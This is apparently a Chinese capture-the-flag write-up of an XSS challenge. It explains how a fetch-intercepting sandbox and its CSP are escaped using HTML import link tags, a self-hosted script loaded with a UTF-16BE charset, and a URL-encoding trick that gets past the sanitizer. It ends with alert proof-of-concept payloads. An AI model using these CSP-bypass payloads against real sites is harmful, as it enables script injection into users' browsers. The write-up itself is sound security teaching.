首先将文件下到本地运行，加上各种代码打 log 看清楚程序流程与各个参数。

可以发现，程序的关键是通过监听了 fetch，对于网页中所有的网络请求进行了拦截定制，对于特定 URL，返回特定的内容。
同时，网页本身被设置了 `default-src: self`，意味着只能 include 本站的链接。
而程序实现了一个 sandbox，其实就是开启了一个 iframe，在 iframe 中设置了 `default-src: none; script-src *`，对于从 iframe 中发出的请求，实际上并不会发出，返回已经被固定，几乎等于是什么都做不了。
最后程序通过在 sandbox 中实际渲染，将违反规则的代码过滤掉后传递到沙盒外网页中渲染。

首先通过队友发现的 payload：

```html
<link rel="import" href='https://raw.githubusercontent.com/garzon/GitHubIOTest/gh-pages/payload' />
<link rel="import" href='https://raw.githubusercontent.com/garzon/GitHubIOTest/gh-pages/payload' />
<link rel="import" href='sandbox?html=%3cscript%20src=%22https://raw.githubusercontent.com/garzon/GitHubIOTest/gh-pages/payload%22%3e%3c/script%3e' />
```

我们可以成功将一个 link 标签逃出沙盒，即得到：

```html
<link rel="import" href='sandbox?html=%3cscript%20src=%22https://raw.githubusercontent.com/garzon/GitHubIOTest/gh-pages/payload%22%3e%3c/script%3e' />
```

那么这样实际上我们可以成功在外部页面中嵌入了 script 标签，但是由于 CSP 的限制，我们无法引用外部脚本，也无法 inline 脚本。此时最好的办法无疑就是在引用本站文件，将其作为 js 脚本解释执行。
但题目中已经说明，并没有其他页面，而我们所看到的页面中，页面内容能受我们控制的仅有 `/sandbox`。
不幸的是，`/sandbox` 页面的开头我们并不能控制，这对于当做 js 解释执行是致命的，因为一旦遇到错误这个脚本便会停止。

仔细思考，常见的方法是将一段字符串当做变量名，避免脚本不合法，但 `/sandbox` 页面开头包含太多不符合变量名规则的字符。
此时我们就需要 utf-16 这样一个奇葩的编码方式出场了，作为必须两个字符才能表示一个字符编码，utf-16 可以让大量字符变成合法的字符。
但尝试后会发现，`e ` 会被当做 `\u2065`，这一字符仍旧不在合法的 js 变量名字符中，会导致脚本产生 `Uncaught SyntaxError: Invalid or unexpected token` 的报错。
为了避免这一问题，我们可以使用 utf-16 的大端表示法，即 utf-16be 来使得语法合法。

其实我们可以发现，utf-16be 被 sanitize 函数特殊过滤了，或许是主办方的一个提示，绕过这一个过滤也很简单，一个 urlencode 即可。

于是最终一个 `alert` 的 exp 如下：

```html
<link rel="import" href='https://raw.githubusercontent.com/garzon/GitHubIOTest/gh-pages/payload' />
<link rel="import" href='https://raw.githubusercontent.com/garzon/GitHubIOTest/gh-pages/payload' />
<link rel="import" href='sandbox?html==%3Cscript%20charset%3D%22utf-1%36be%22%20src%3D%22sandbox%3Fhtml%3D%2500=%25001%2500;%2500a%2500l%2500e%2500r%2500t%2500%2528%25001%2500%2529%22%3E%3C/script%3E'/>
```
